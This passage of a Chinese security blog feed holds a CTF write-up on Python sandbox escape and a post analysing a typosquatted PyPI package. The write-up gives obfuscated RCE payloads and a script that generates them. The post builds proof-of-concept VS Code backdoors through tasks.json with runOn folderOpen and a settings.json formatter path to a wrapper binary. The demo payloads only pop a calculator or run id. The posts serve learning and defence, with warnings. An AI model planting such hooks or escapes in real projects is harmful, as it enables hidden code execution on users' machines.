<code>list</code> + <code>dict</code> 构造。所以这个 payload 可以变成这样：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs py">CMD = [<span class="hljs-built_in">eval</span>][<span class="hljs-built_in">eval</span>(<span class="hljs-built_in">list</span>(<span class="hljs-built_in">dict</span>(b_o_o_l=<span class="hljs-number">1</span>))[<span class="hljs-number">0</span>][::<span class="hljs-number">2</span>])(<span class="hljs-built_in">eval</span>(<span class="hljs-built_in">list</span>(<span class="hljs-built_in">dict</span>(e_x_e_c=<span class="hljs-number">1</span>))[<span class="hljs-number">0</span>][::<span class="hljs-number">2</span>])(<span class="hljs-built_in">eval</span>(<span class="hljs-built_in">list</span>(<span class="hljs-built_in">dict</span>(b_y_t_e_s=<span class="hljs-number">1</span>))[<span class="hljs-number">0</span>][::<span class="hljs-number">2</span>])([<span class="hljs-built_in">eval</span>(<span class="hljs-built_in">list</span>(<span class="hljs-built_in">dict</span>(o_r_d=<span class="hljs-number">1</span>))[<span class="hljs-number">0</span>][::<span class="hljs-number">2</span>])(j)<span class="hljs-keyword">for</span>(i)<span class="hljs-keyword">in</span>(<span class="hljs-built_in">list</span>(<span class="hljs-built_in">eval</span>(<span class="hljs-built_in">list</span>(<span class="hljs-built_in">dict</span>(o_p_e_n=<span class="hljs-number">1</span>))[<span class="hljs-number">0</span>][::<span class="hljs-number">2</span>])(<span class="hljs-built_in">eval</span>(<span class="hljs-built_in">list</span>(<span class="hljs-built_in">dict</span>(s_t_r=<span class="hljs-number">1</span>))[<span class="hljs-number">0</span>][::<span class="hljs-number">2</span>])(<span class="hljs-built_in">eval</span>(<span class="hljs-built_in">list</span>(<span class="hljs-built_in">dict</span>(_1_1i1m1p1o1r1t1_1_=<span class="hljs-number">1</span>))[<span class="hljs-number">0</span>][::<span class="hljs-number">2</span>])(<span class="hljs-built_in">list</span>(<span class="hljs-built_in">dict</span>(b_a_s_e_6_4=<span class="hljs-number">1</span>))[<span class="hljs-number">0</span>][::<span class="hljs-number">2</span>]))[<span class="hljs-number">23</span>:-<span class="hljs-number">2</span>])))[:-<span class="hljs-number">5</span>]<span class="hljs-keyword">for</span>(j)<span class="hljs-keyword">in</span>(i)])))](<span class="hljs-built_in">eval</span>(<span class="hljs-built_in">list</span>(<span class="hljs-built_in">dict</span>(b_6_4_d_e_c_o_d_e=<span class="hljs-number">1</span>))[<span class="hljs-number">0</span>][::<span class="hljs-number">2</span>])(<span class="hljs-built_in">list</span>(<span class="hljs-built_in">dict</span>(X19pbXBvcnRfXygnb3MnKS5wb3BlbignZWNobyBIYWNrZWQ6IGBpZGAnKS5yZWFkKCkg=<span class="hljs-number">1</span>))[<span class="hljs-number">0</span>]))<br></code></pre></td></tr></table></figure><p>至此，还有三个特殊字符需要解决：<code>=</code>、<code>/</code>、<code>+</code>。一旦 payload 经过 base64 编码之后出现这三个字符就没法当做 <code>dict</code> 的参数了。</p><p>仔细回想一下小学 2 年级就学过的 base64 编码：</p><p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/common-exp-of-python-jail/8aec7b57-6e48-4e29-924e-79fbe76e3f5d.png!blog#width-zoom6" /></p><p>当红框里的二进制变成 <code>111111</code> 的时候，根据 base64 规范，此时应该编码为 <code>/</code>。这就要求原本的字符以 6 个 <code>1</code> 结尾，符合这种条件的 ascii 字符，只有一个：<code>?</code>。也就是说，只要位置为 3 的倍数上的字符是 <code>?</code>，那么编码后就会出现 <code>/</code>：</p><p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/common-exp-of-python-jail/ffef65e4-f472-4daa-8f76-afd392636688.png!blog#width-zoom5" /></p><p>知道原因之后，解决方式就很简单了：插入无关紧要的字符，挤走原本位于 3 倍数位置的 <code>?</code>。</p><p>同理，编码后出现 <code>+</code> 可能的字符有 <code>&gt;</code>、<code>~</code>；编码后出现 <code>=</code> 的原因是源字符串长度不为 <code>=</code> 的倍数。这些都可以通过加无关紧要的字符来解决：</p><p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/common-exp-of-python-jail/9fde21ff-54a5-4506-8309-185cfe98ff8e.png!blog#width-zoom7" /></p><h3 id="通解三">通解三</h3><p>比较遗憾的是，上面这个 payload，当利用点处于函数内部的时候，由于 <code>exec</code> 生成的变量无法在函数上下文中使用，所以在执行模块源码的时候通常会报错。例如上面这个就会报 <code>name '_bytes_from_decode_data' is not defined</code>：</p><p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/common-exp-of-python-jail/bb1a9ea3-64f5-4a58-a542-345fd9b936c7.png!blog" /></p><p>一开始我的思路是：能否寻找到一个库的源码，其中有一行 <code>__import__("binascii").a2b_base64</code>，如果有的话，我就可以通过切片切出来这一句话，然后用 <code>eval</code> 执行，参数可以通过 for 循环搞定：</p><p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/common-exp-of-python-jail/101ed2df-99b9-428d-a242-003d6d5483bf.png!blog" /></p><p>但遗憾的是，经过一番搜索，并没有找到合适的标准库的源码可以用来执行导入解码模块的语句，要么就是存在多级目录，在无法判断 python 绝对路径的情况下，不实用。因此需要另寻它法。</p><p>再经过一番探索，我发现 <code>vars()</code> 真是完美。它有一个可选参数，当没指定参数的时候，与 <code>locals()</code> 结果一致。当指定参数的时候，会获取参数所在命名空间的 <code>locals()</code>。所以我们可以先 <code>import binascii</code> ，在利用 <code>vars(binascii)</code> 取出里面的 <code>a2b_base64</code> 从而进行 base64 解码：<br /><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-built_in">eval</span>(<span class="hljs-built_in">vars</span>(<span class="hljs-built_in">eval</span>(<span class="hljs-built_in">list</span>(<span class="hljs-built_in">dict</span>(_1_1i1m1p1o1r1t1_1_=<span class="hljs-number">1</span>))[<span class="hljs-number">0</span>][::<span class="hljs-number">2</span>])(<span class="hljs-built_in">list</span>(<span class="hljs-built_in">dict</span>(b_i_n_a_s_c_i_i_=<span class="hljs-number">1</span>))[<span class="hljs-number">0</span>][::<span class="hljs-number">2</span>]))[<span class="hljs-built_in">list</span>(<span class="hljs-built_in">dict</span>(a_2_b1_1b_a_s_e_6_4=<span class="hljs-number">1</span>))[<span class="hljs-number">0</span>][::<span class="hljs-number">2</span>]](<span class="hljs-built_in">list</span>(<span class="hljs-built_in">dict</span>(X19pbXBvcnRfXygnb3MnKS5wb3BlbignZWNobyBIYWNrZWQ6IGBpZGAnKS5yZWFkKCkg=<span class="hljs-number">1</span>))[<span class="hljs-number">0</span>]))<br></code></pre></td></tr></table></figure></p><p>相比上面的 payload 来说，它还不需要 <code>for</code>，非常纯净的通解。</p><h3 id="通解四">通解四</h3><p>再疯狂一点，如果把数字禁用了，如何？</p><p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/common-exp-of-python-jail/e28159e6-237a-4e46-a517-e1a92e183983.png!blog#width-zoom3" /></p><p>这就是《OrangeKiller CTF 第 3 期》中的第三道题。</p><p>切片中的数字好说：</p><ul><li><code>0</code> -&gt; <code>len([])</code></li><li><code>2</code> -&gt; <code>len(list(dict(aa=()))[len([])])</code></li></ul><p>由于我选用的是 <code>dict()</code>，参数里的数字应该如何绕过呢？答案还是 Unicode！可用的数字列表见：</p><p>https://www.fileformat.info/info/unicode/category/Nd/list.htm</p><p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/common-exp-of-python-jail/5c3e82f7-7d54-4f04-8929-eef61d679ace.png!blog#width-zoom3" /></p><p>所以，终极版的 payload 如下：<br /><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-built_in">vars</span>(<span class="hljs-built_in">eval</span>(<span class="hljs-built_in">list</span>(<span class="hljs-built_in">dict</span>(_a_aiamapaoarata_a_=()))[<span class="hljs-built_in">len</span>([])][::<span class="hljs-built_in">len</span>(<span class="hljs-built_in">list</span>(<span class="hljs-built_in">dict</span>(aa=()))[<span class="hljs-built_in">len</span>([])])])(<span class="hljs-built_in">list</span>(<span class="hljs-built_in">dict</span>(b_i_n_a_s_c_i_i_=()))[<span class="hljs-built_in">len</span>([])][::<span class="hljs-built_in">len</span>(<span class="hljs-built_in">list</span>(<span class="hljs-built_in">dict</span>(aa=()))[<span class="hljs-built_in">len</span>([])])]))[<span class="hljs-built_in">list</span>(<span class="hljs-built_in">dict</span>(a_𝟤_b𝟣_𝟣b_a_s_e_𝟨_𝟦=()))[<span class="hljs-built_in">len</span>([])][::<span class="hljs-built_in">len</span>(<span class="hljs-built_in">list</span>(<span class="hljs-built_in">dict</span>(aa=()))[<span class="hljs-built_in">len</span>([])])]](<span class="hljs-built_in">list</span>(<span class="hljs-built_in">dict</span>(X𝟣𝟫pbXBvcnRfXygnb𝟥MnKS𝟧wb𝟥BlbignZWNobyBIYWNrZWQ𝟨IGBpZGAnKS𝟧yZWFkKCkg=()))[<span class="hljs-built_in">len</span>([])])<br></code></pre></td></tr></table></figure></p><p>其中需要用到的字符：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs py">In [<span class="hljs-number">5</span>]: <span class="hljs-built_in">set</span>(re.findall(<span class="hljs-string">&#x27;\w+&#x27;</span>, CMD))<br>Out[<span class="hljs-number">5</span>]:<br>&#123;<span class="hljs-string">&#x27;X𝟣𝟫pbXBvcnRfXygnb𝟥MnKS𝟧wb𝟥BlbignZWNobyBIYWNrZWQ𝟨IGBpZGAnKS𝟧yZWFkKCkg&#x27;</span>,<br> <span class="hljs-string">&#x27;_a_aiamapaoarata_a_&#x27;</span>,<br> <span class="hljs-string">&#x27;a_𝟤_b𝟣_𝟣b_a_s_e_𝟨_𝟦&#x27;</span>,<br> <span class="hljs-string">&#x27;aa&#x27;</span>,<br> <span class="hljs-string">&#x27;b_i_n_a_s_c_i_i_&#x27;</span>,<br> <span class="hljs-string">&#x27;dict&#x27;</span>,<br> <span class="hljs-string">&#x27;eval&#x27;</span>,<br> <span class="hljs-string">&#x27;len&#x27;</span>,<br> <span class="hljs-string">&#x27;list&#x27;</span>,<br> <span class="hljs-string">&#x27;vars&#x27;</span>&#125;<br><br>In [<span class="hljs-number">6</span>]: <span class="hljs-built_in">set</span>(re.findall(<span class="hljs-string">&#x27;\W&#x27;</span>, CMD))<br>Out[<span class="hljs-number">6</span>]: &#123;<span class="hljs-string">&#x27;(&#x27;</span>, <span class="hljs-string">&#x27;)&#x27;</span>, <span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-string">&#x27;=&#x27;</span>, <span class="hljs-string">&#x27;[&#x27;</span>, <span class="hljs-string">&#x27;]&#x27;</span>&#125;<br></code></pre></td></tr></table></figure><p>构造脚本：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs py">u = <span class="hljs-string">&#x27;𝟢𝟣𝟤𝟥𝟦𝟧𝟨𝟩𝟪𝟫&#x27;</span><br><br>CMD = <span class="hljs-string">&quot;eval(vars(eval(list(dict(_a_aiamapaoarata_a_=()))[len([])][::len(list(dict(aa=()))[len([])])])(list(dict(b_i_n_a_s_c_i_i_=()))[len([])][::len(list(dict(aa=()))[len([])])]))[list(dict(a_2_b1_1b_a_s_e_6_4=()))[len([])][::len(list(dict(aa=()))[len([])])]](list(dict(X19pbXBvcnRfXygnb3MnKS5wb3BlbignZWNobyBIYWNrZWQ6IGBpZGAnKS5yZWFkKCkg=()))[len([])]))&quot;</span><br><br>CMD = CMD.translate(&#123;<span class="hljs-built_in">ord</span>(<span class="hljs-built_in">str</span>(i)): u[i] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>)&#125;)<br></code></pre></td></tr></table></figure><p>最后，像 <code>eval</code> 这种，直接用 Unicode 就可以解决，我就不啰嗦了，之前都说过的。</p><p>coooooooooooool~</p><h2 id="总结">总结</h2><p>OrangeKiller CTF 第 3 期 所需的知识点，其实都在这篇文章里了，我就不啰嗦了。</p><p>这篇写完之后顿觉神清气爽。现在 CTF 中的 Python 题还是比较简单的 —— Web 题似乎还是 PHP 的天下。什么时候 Python 也能像 PHP 这样被人探索出各种奇妙的利用呢？本文的姿势似乎尚未有前人探索，或许也算为 Python 的奇技淫巧共享出属于自己的一小份力量了。</p><br><p style="text-align: center;"><font size="2px" color="gray">提前祝橘友们国庆快乐！</font><br /><img src="https://clean-1252075454.cos.ap-nanjing.myqcloud.com/20200528120800990.png" style="zoom:30%" /></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;这篇其实有《OrangeKiller CTF 第 3 期》中所有需要的知识点，也算 wp 了。提前祝各位国庆快乐！&lt;/p&gt;</summary>
    
    
    
    <category term="经验总结" scheme="https://www.tr0y.wang/categories/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/"/>
    
    
    <category term="Python" scheme="https://www.tr0y.wang/tags/Python/"/>
    
    <category term="Web" scheme="https://www.tr0y.wang/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>OrangeKiller CTF 第 3 期</title>
    <link href="https://www.tr0y.wang/2022/09/26/OrangeKiller_CTF_3/"/>
    <id>https://www.tr0y.wang/2022/09/26/OrangeKiller_CTF_3/</id>
    <published>2022-09-26T19:30:00.000Z</published>
    <updated>2023-05-04T09:44:57.348Z</updated>
    
    <content type="html"><![CDATA[<p>3 题高质量题目，本期的主题是 Python 沙箱逃逸</p><span id="more"></span><p>本次同样没有题目描述，因为题目是可自解释的形式，所有所需的信息、源码等信息都在页面里。题目考点也比较明显，不需要花大量时间理解考点。</p><p>一共 3 题，have fun!</p><h2 id="题目">题目</h2><h3 id="baby-rce">baby rce</h3><p>一共 3 题：</p><ul><li>baby rce</li><li>baby rce's revenge</li><li>baby rce's re-revenge</li></ul><p>题目链接：<br>https://baby-python-rce.herokuapp.com/</p><p>第一题是热身题，没啥特别的。</p><p>第二道题正如 Tornado 那篇所说，它来源于虎符杯决赛后，我对自己发起的一次挑战：</p><p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/OrangeKiller_CTF_3/96891bc5-1ce6-4e21-b99c-5f52cad490d2.png!blog#width-zoom7" /></p><p>第三道题的难度更上一层楼。同时也意味着，如果能做出这道题，那么对于 CTF 中绝大多数的 SSTI（非自定义语法）和沙箱逃逸题是可以秒杀的。</p><p>需要注意的是，以上三道题目的环境均为 Python 3.x，并且这三道题目的 flag 是一个，因为主要目的还是考察如何绕过限制条件去 RCE，我比较懒，就不分环境部署了。</p><p>本来打算 writeup 一起发出来的，但是由于本次 wp 涉及到 Python 沙箱逃逸的通解的探索，而整个探索过程又非常非常有趣，所以我会单独成(shui)文发布。</p><br><p style="text-align: center;"><font size="2px" color="gray">别催了在写了<br>咕咕咕...国庆前一定！</font><br /><img src="https://clean-1252075454.cos.ap-nanjing.myqcloud.com/20200528120800990.png" style="zoom:30%" /></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;3 题高质量题目，本期的主题是 Python 沙箱逃逸&lt;/p&gt;</summary>
    
    
    
    <category term="活动" scheme="https://www.tr0y.wang/categories/%E6%B4%BB%E5%8A%A8/"/>
    
    
    <category term="CTF" scheme="https://www.tr0y.wang/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>利用 vscode 打造后门门中门</title>
    <link href="https://www.tr0y.wang/2022/08/11/vscode-door/"/>
    <id>https://www.tr0y.wang/2022/08/11/vscode-door/</id>
    <published>2022-08-11T19:00:00.000Z</published>
    <updated>2023-05-04T09:44:57.356Z</updated>
    
    <content type="html"><![CDATA[<p>俗话说，常在河边走...</p><span id="more"></span><h2 id="起因">起因</h2><p>7.25 有位小伙伴在小群里发了这张截图：</p><p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/vscode-door/fcadd487-8933-4d3b-8cd9-fd9ee6108011.png!blog#width-zoom5" /></p><p><code>fake_useragent</code> 相信写爬虫比较多的橘友都用过，它可以随机生成一些看起来很合理的 ua，用来做一些简单的反反爬。这个恶意的库名叫 <code>fake_useragant</code>，就差一个字母。</p><p>正好那段时间在护网，所以我想着不如分析分析看看是不是攻击队又有啥新手法了。</p><h2 id="分析过程">分析过程</h2><p>由于 pypi 官方响应非常快，这个包在我准备下载的时候已经被删除了。不过一般来说自建源和官方源的同步都存在一定的时间差，所以可以去清华源之类的下载（其实这个时候也可以看出自建源存在的弊端）。</p><p>整个恶意库的源码非常简单：</p><p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/vscode-door/9d1abd82-258e-486b-8ca0-04e6689469cd.png!blog#width-zoom7" /></p><p>然后下载真正的 <code>fake_useragent</code> 做了一下 diff。其实直接看修改日期也可以看到哪些文件改掉了。</p><p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/vscode-door/4ff61ae1-27ba-47dd-8404-ad0e6aba9cbf.png!blog" /></p><p>除了名字替换之外，主要的修改在：</p><ol type="1"><li><code>fake.py</code> 中新增了 <code>FakeUserAgent.exit</code> 方法</li><li>新增了 <code>urllib2.py</code>，里面有 <code>task</code> 和 <code>urlparse</code> 函数，还特意用 <code>import pickle as json</code> 做了个障眼法。<code>task</code> 会调用 <code>urlparse</code>，而 <code>urlparse</code> 函数包含了恶意的 payload</li></ol><p>恶意的 payload 解到最后是这样的：<br /><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/vscode-door/6ab81083-c298-46af-adde-cc12edffbfc8.png!blog" /></p><p>感兴趣的橘友可以自行分析这段 shellcode 的作用。</p><p>分析到此就结束了，这个后门并不复杂。问题是，通常恶意库的触发点都会放在 <code>setup.py</code> 下，但是我并没有在这个后门的源码中找到触发点，也就是说我直接 <code>pip install</code> 也不会有问题。这就很奇怪了。</p><p>问了下小伙伴，说是有个人假装防守队，说自己捕获了攻击队的 0day 利用，所以写了个 exp 放到 GitHub 上了：</p><p>https://github.com/FuckRedTeam/360tianqingRCE/blob/1326a51307e576b22a36ec79c466471af5e17086/360tianqing-RCE.py#L90</p><p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/vscode-door/a61067d8-a4a5-41a3-9126-105a39976ff6.png!blog#width-zoom5" /></p><p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/vscode-door/fd72b806-5618-4157-8ff5-4603ac3bde65.png!blog#width-zoom7" /></p><p>这鱼钓的。。。所以它俩是搭配使用的，这就说的通了。</p><h2 id="vscode-能否触发后门">vscode 能否触发后门？</h2><p>至此，还剩最后一个问题，就是网传用 vscode 打开之后，点击信任文件夹也可能会被日。那么到底存不存在这种可能性呢？如果可能的话，那么具体要如何复现呢？</p><h3 id="文件夹的信任模式">文件夹的信任模式</h3><p>vscode 会在你打开一个新的文件夹时提示：</p><p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/vscode-door/3076b2de-b6f4-4357-b6d4-fc6e42d9123a.png!blog#width-zoom7" /></p><p>由于我没用过 vscode，一般用的是 sublime，所以我特意去官网上看了下这个操作的含义：</p><p>https://code.visualstudio.com/docs/editor/workspace-trust#_trusting-a-workspace</p><p>设置为不信任模式，主要是通过禁用或限制几个 vscode 功能的操作来阻止自动代码执行，包括：task、debug、工作区设置和插件。所以我们可以尝试通过这几种配置来制作后门。</p><h3 id="门中门">门中门</h3><p>为了实现我们的目的，首先需要创建一个 <code>.vscode</code> 目录。</p><p>由于精力有限，我就测试了两种方式。</p><h4 id="tasks.json-后门">tasks.json 后门</h4><p>看了下 task 的配置，文件名就叫 <code>tasks.json</code>，配置如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs js">&#123;<br>    <span class="hljs-string">&quot;version&quot;</span>: <span class="hljs-string">&quot;1.0.0&quot;</span>,<br>    <span class="hljs-string">&quot;tasks&quot;</span>: [<br>        &#123;<br>            <span class="hljs-string">&quot;label&quot;</span>: <span class="hljs-string">&quot;x&quot;</span>,<br>            <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;shell&quot;</span>,<br>            <span class="hljs-string">&quot;command&quot;</span>: <span class="hljs-string">&quot;calc; open -a /System/Applications/Calculator.app&quot;</span>,<br>            <span class="hljs-string">&quot;presentation&quot;</span>: &#123;<br>                <span class="hljs-string">&quot;reveal&quot;</span>: <span class="hljs-string">&quot;never&quot;</span><br>            &#125;,<br>            <span class="hljs-string">&quot;runOptions&quot;</span>: &#123;<br>                <span class="hljs-string">&quot;runOn&quot;</span>: <span class="hljs-string">&quot;folderOpen&quot;</span>,<br>            &#125;<br>        &#125;<br>    ]<br>&#125;<br></code></pre></td></tr></table></figure><p>稍微解释一下：</p><ol type="1"><li><code>type</code>、<code>command</code>：用于配置自动执行的命令</li><li><code>presentation</code> 的 <code>reveal</code> 需要设置为 <code>"never"</code>，这样执行 task 的时候就不会弹个控制台出来。</li><li><code>runOptions</code> 的 <code>runOn</code> 设定为文件夹打开的时候就执行</li></ol><p>至于这个执行的命令，为了兼容多平台，可以用 <code>;</code> 分割写不同的指令，执行失败会继续尝试。</p><p>这样，只要分析的时候不小心点了“信任”，就会触发这个后门。</p><p>需要注意的是，提示是否信任的时候，如果点击得太慢，那么本次是不会触发 task 执行的（我猜测弹窗等待确认并不会阻塞执行 task 的逻辑，它们是并行的事件），但是下次打开必定会触发。</p><h4 id="settings.json-后门">settings.json 后门</h4><p>vscode 的配置比较多，我这里就举个例子说明吧。</p><p><code>settings.json</code> 里可以给插件配置一个可执行文件的位置。如果这个可执行文件是后门，那么在格式化代码的时候就会触发：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js">&#123;<br>    <span class="hljs-string">&quot;files.autoSave&quot;</span>: <span class="hljs-string">&quot;onWindowChange&quot;</span>,<br>    <span class="hljs-string">&quot;editor.formatOnSave&quot;</span>: <span class="hljs-literal">true</span>,<br>    <span class="hljs-string">&quot;editor.formatOnPaste&quot;</span>: <span class="hljs-literal">true</span>,<br>    <span class="hljs-string">&quot;python.formatting.autopep8Path&quot;</span>: <span class="hljs-string">&quot;.vscode/a.out&quot;</span>,<br>&#125;<br></code></pre></td></tr></table></figure><ol type="1"><li><code>python.formatting.autopep8Path</code> 将 <code>autopep8</code> 的可执行文件指向我们的后门。需要注意的是这里似乎无法使用 shell 脚本，必须要是一个二进制类型的可执行文件</li><li><code>editor.formatOnPaste</code>（声明文件在保存时自动格式化代码；）、<code>editor.formatOnPaste</code>（声明文件在粘贴时自动格式化代码）、<code>files.autoSave</code>（文件在 vscode 失去焦点时自动保存），这三者都是为了提高触发后门的几率</li></ol><p>接下来只需要写个恶意的二进制文件就行了：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> *argv[])</span> &#123;<br>    <span class="hljs-type">char</span> str[<span class="hljs-number">300</span>] = &#123;&#125;;<br>    <span class="hljs-built_in">strcat</span>(str, <span class="hljs-string">&quot;open -a /System/Applications/Calculator.app; autopep8 &quot;</span>);<br>    <span class="hljs-built_in">strcat</span>(str, argv[<span class="hljs-number">1</span>]);<br>    <span class="hljs-built_in">strcat</span>(str, <span class="hljs-string">&quot; &quot;</span>);<br>    <span class="hljs-built_in">strcat</span>(str, argv[<span class="hljs-number">2</span>]);<br>    system(str);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>恶意指令后面加个 <code>autopep8</code> 以及传入的参数用于正常地去格式化代码，尽量做到无感。</p><p>需要注意的是这个可执行文件不要随意打印内容，否则会执行失败，具体原因我也懒得研究了。</p><p>最后我们可以故意把源码弄成很乱的格式，正常一看这么乱肯定就要先格式化一下，然后就 G 了。</p><p>源码都打包传到 pypi 去了，payload 就是弹个计算器而已，没有攻击性的 payload，感兴趣可以自己尝试一下：</p><blockquote><p>源码</p></blockquote><p>https://github.com/Macr0phag3/vscode-door</p><blockquote><p>py 库地址</p></blockquote><p>https://pypi.org/project/fake-usreagant/0.0.3/#files</p><p>要做到比较完善的话，可能需要搜集下类似的插件，尽可能把可执行文件路径的配置覆盖全。同时其他配置也可能可以制作后门。</p><p>最后再说一点，vscode 在信任的时候有个选项，可以勾选是否信任父文件夹，<strong>这个一定要谨慎打钩</strong>。一个常见的攻击场景是，某安全工程师由于经常需要下载源码预览，为了方便就把整个下载目录设为可信目录。这个时候只要下到一个带有 <code>.vscode</code> 的恶意源码就会中招。</p><p>并且其他编辑器例如 idea 或许也存在这个问题，精力有限，就不测试了。</p><h2 id="总结">总结</h2><p>其实 <code>360tianqing-RCE.py</code> 那个仓库最好再加个 <code>requirement.txt</code>，这样可能会有人直接 <code>pip install -r requirement.txt</code> 了，中招的概率进一步增大，这一点没啥好说的，不管是不是敏感时期，拿到 exp 都要仔细看看啊。</p><p>其次就是分析恶意软件或者源码的时候尽量在虚拟机进行吧。像 vscode 这种信任，说实话，绝大部分人都会点信任，在河边走哪有不湿鞋，还是小心点为妙。</p><br><p style="text-align: center;"><font size="2px" color="gray">你你你居然在 exp 里下毒！</font><br /><img src="https://clean-1252075454.cos.ap-nanjing.myqcloud.com/20200528120800990.png" style="zoom:30%" /></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;俗话说，常在河边走...&lt;/p&gt;</summary>
    
    
    
    <category term="经验总结" scheme="https://www.tr0y.wang/categories/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/"/>
    
    
    <category term="Web" scheme="https://www.tr0y.wang/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>SecMap - SSTI（Tornado）</title>
    <link href="https://www.tr0y.wang/2022/08/05/SecMap-SSTI-tornado/"/>
    <id>https://www.tr0y.wang/2022/08/05/SecMap-SSTI-tornado/</id>
    <published>2022-08-05T14:47:44.000Z</published>
    <updated>2023-05-04T09:44:57.352Z</updated>
    
    <content type="html"><![CDATA[<p>本来以为 Flask + mako 够用了。最近老遇到需要用到 Tornado 知识点的地方。好好好，我学，我学还不行吗？</p><span id="more"></span><h2 id="光速入门">光速入门</h2><p>首先当然要看官方文档了：</p><p>https://www.tornadoweb.org/en/stable/</p><p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-SSTI-tornado/a2f41228-2885-4d21-963d-88efc2065cd6.png!blog" /></p><p>反正就是一个字：快。</p><p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-SSTI-tornado/b48e4fdd-816c-47e6-bc56-7434cbe09fd0.png!blog" /></p><p>单线程能够达到这么高的并发，属实有点牛逼。</p><p>根据文档，Tornado 大致提供了三种不同的组件：</p><ul><li>Web 框架</li><li>HTTP 服务端以及客户端</li><li>异步的网络框架，可以用来实现其他网络协议</li></ul><p>那么显然，本文重点关注第一点：Web 框架。</p><h3 id="tornado-web-服务例子">Tornado web 服务例子</h3><p>下面看一个示例：<br /><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> tornado.ioloop, tornado.web<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">IndexHandler</span>(tornado.web.RequestHandler):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(self.get_argument(<span class="hljs-string">&#x27;a&#x27;</span>))<br>        self.write(<span class="hljs-string">&quot;get!&quot;</span>)<br><br><br>app = tornado.web.Application(<br>    [(<span class="hljs-string">&#x27;/&#x27;</span>, IndexHandler)],<br>)<br>app.listen(<span 